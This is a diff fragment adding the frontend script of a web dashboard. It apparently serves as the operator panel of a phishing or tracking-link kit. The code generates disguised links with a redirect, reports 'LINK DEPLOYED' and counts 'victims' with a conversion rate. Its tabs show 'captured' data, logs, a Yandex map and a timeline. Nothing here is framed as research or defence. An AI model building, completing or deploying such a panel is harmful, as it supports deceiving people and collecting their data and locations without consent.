+            const template = document.getElementById('template-select').value;
+            const redirect = document.getElementById('redirect-url').value || 'https://google.com';
+            
+            try {
+                const res = await fetch('/generate', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ template, redirect })
+                });
+                const data = await res.json();
+                
+                document.getElementById('final-link').innerText = data.link;
+                document.getElementById('link-output').classList.remove('hidden');
+                showToast('LINK DEPLOYED');
+                updateStats();
+            } catch(e) {
+                showToast('Error generating link');
+            }
+        }
+
+        function copyLink() {
+            const link = document.getElementById('final-link').innerText;
+            if (link) {
+                navigator.clipboard.writeText(link);
+                showToast('COPIED');
+            }
+        }
+
+        // ============================================================
+        // STATS
+        // ============================================================
+        async function updateStats() {
+            try {
+                const res = await fetch('/api/stats');
+                const stats = await res.json();
+                document.getElementById('stat-total').innerText = stats.total || 0;
+                document.getElementById('stat-24h').innerText = stats.last24h || 0;
+                document.getElementById('stat-live').innerText = stats.active || 0;
+                document.getElementById('stat-conversion').innerText = (stats.conversionRate || 0) + '%';
+                
+                const ctx = document.getElementById('hitChart').getContext('2d');
+                const labels = Object.keys(stats.daily || {});
+                const data = Object.values(stats.daily || {});
+                
+                if (window.chartInstance) window.chartInstance.destroy();
+                window.chartInstance = new Chart(ctx, {
+                    type: 'line',
+                    data: {
+                        labels: labels,
+                        datasets: [{
+                            data: data,
+                            borderColor: '#3b82f6',
+                            tension: 0.4,
+                            fill: true,
+                            backgroundColor: 'rgba(59, 130, 246, 0.1)',
+                            pointRadius: 4,
+                            pointBackgroundColor: '#3b82f6'
+                        }]
+                    },
+                    options: {
+                        responsive: true,
+                        maintainAspectRatio: false,
+                        plugins: { 
+                            legend: { display: false },
+                            tooltip: {
+                                callbacks: {
+                                    label: function(context) {
+                                        return context.parsed.y + ' victims';
+                                    }
+                                }
+                            }
+                        },
+                        scales: {
+                            y: { 
+                                beginAtZero: true, 
+                                grid: { color: 'rgba(255,255,255,0.05)' }, 
+                                ticks: { color: '#475569' } 
+                            },
+                            x: { 
+                                grid: { display: false }, 
+                                ticks: { color: '#475569' } 
+                            }
+                        }
+                    }
+                });
+            } catch(e) {
+                console.error('Stats update error:', e);
+            }
+        }
+
+        // ============================================================
+        // INITIALIZATION
+        // ============================================================
+        document.addEventListener('DOMContentLoaded', function() {
+            updateStats();
+            refreshLogs();
+            refreshCaptured();
+            
+            setInterval(() => {
+                const activeTab = document.querySelector('.tab-content.active');
+                if (activeTab) {
+                    const id = activeTab.id.replace('section-', '');
+                    if (id === 'logs') refreshLogs();
+                    if (id === 'captured') refreshCaptured();
+                    if (id === 'map') refreshYandexMap();
+                    if (id === 'timeline') refreshTimeline();
+                }
+                updateStats();
+            }, 15000);
+        });
+    </script>
+</body>
+</html>
